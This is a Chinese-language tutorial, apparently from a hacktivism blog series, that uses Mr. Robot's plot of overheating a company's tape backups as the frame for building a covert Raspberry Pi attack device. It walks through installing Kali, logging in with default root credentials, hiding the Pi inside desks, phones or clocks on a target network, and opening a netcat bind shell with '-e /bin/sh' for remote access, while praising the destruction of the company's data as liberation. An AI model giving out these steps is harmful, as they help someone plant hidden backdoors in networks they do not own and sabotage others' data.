    “融化” 所有债务 ……如何构建黑客树莓派 — 黑客主义行动力（6）

    Mr. Robot 中最有趣的部分就在于黑客行为主义操作非常真实，几乎每一步都是如此。

    在第4季中，Elliott 计划使用树莓派控制邪恶公司正在存储其磁带备份的存储室的加热系统（暖通空调HVAC系统）。如果可以在存储室中充分升高温度，就能造成这些磁带备份无法再使用，也就是毁掉邪恶公司的所有数据。

    在这些磁带备份上记录了全世界70％的消费者债务，包括数十亿美元的学生贷款。

    黑客们相信，只要销毁所有这些记录，那么数百万人就可以解放了 —— 摆脱邪恶公司的债务陷阱。

    • 《 债务反叛运动：传统的阶层斗争可能不再适用 》

    本教程将向您展示 如何创建可以远程控制的黑客树莓派，类似 Elliott 使用的装备。（Raspberry Pi 是一款体积小巧，价格便宜，信用卡大小的计算机，功能强大）

    第一步：下载ARM版本的Kali

    当然，第一步是下载。 Raspberry Pi 和许多移动设备使用 ARM CPU，因为它们更节能更酷，因此必须专门为其编译 Kali 操作系统。幸运的是已经有人帮您做好了。

    导航到 Offensive Security 的下载页面 以获取 Raspberry Pi 文件。下载后使用 WinRAR、WinZip 或任何其他可以解压缩文件的工具将其解压缩。

    第二步：下载并安装 Win32 Disk Imager

    现在需要安装 Win32 Disk Imager，您可以 从 SourceForge 下载 。

    该工具使您能够将映像写入SD卡或USB驱动器。建议使用至少4GB的快速SD卡。您现在可以以约7美元的价格购买16GB。

    第三步：运行磁盘映像

    现在，您已经安装了 Disk Imager，右键单击它并以 “管理员” 身份运行它。

    在 “Image File” 窗口中选择 Kali 映像，在 “设备” 窗口中将映像定向到SD卡，然后单击 “写入” 按钮。请耐心等待，这可能需要一些时间。

    如果您使用 Linux，事情会更简单。无需下载任何内容。您只需使用 dd 命令（dd 命令也用于在数字取证中创建磁盘映像）。

    如果假设该映像名为 Kali-RPI.img 且 SD 卡位于 /dev/sdc 并希望以512k块大小（bs）复制，则只需键入：

    kali >dd if =Kali-RPI.img of = /dev/sdc bs=512k

    第四步：在 Raspberry Pi 中安装SD卡

    现在需要从您的PC上卸下SD卡，然后将SD卡安装到树莓派中并启动它。

    启动时，将带您到命令行打开窗口，询问您的用户名和密码。输入：

    username: root
    password: toor

    然后输入：

    kali > startx

    这将启动Kali的X11 GUI。成功！现在，您有了一个微型 Kali 黑客工具，可以将其放在任何地方！

    第五步：在树莓派上启动 Cryptcat 侦听器

    现在，有了运行 Kali 的 Raspberry Pi，可以将其放置在邪恶公司网络中的​​任何位置。Raspberry Pi 具有以太网连接，您可以添加无线适配器。

    👉Raspberry Pi 非常小，可以隐藏在许多地方 —— 包括台式计算机内部，电话内部，时钟内部等，而不会引起注意。

    连接后，可以通过键入以下内容来启动 Netcat 侦听器（Kali 内置了 Netcat）：

    kali > nc -l -p6996 -e /bin/sh

    这将使 Elliott 可以使用端口 6996 从任何地方连接到树莓派上的终端。

    现在，Elliott 可以通过在他的 Kali 系统上使用 Netcat 连接回 Raspberry Pi，输入以下内容：

    kali > nc 192.168.1.105 6996

    当他键入 ifconfig 时，可以看到在 Raspberry Pi 上已经有一个终端，准备好对邪恶公司的 HVAC 系统进行入侵了。确保在您的环境中使用 Raspberry Pi 的 IP 地址。

    当然，还有其他方法可以连接回树莓派。他可以使用 SSH，并且如果需要 GUI，安装VNC服务器并通过 Kali 的完全GUI控制连接回去。

    最后

    就是这样。现在 Elliott 完全可以控制HVAC系统并调高温度，以熔化备用磁带。数据毁了，所有债务都消失了，人民解放了。
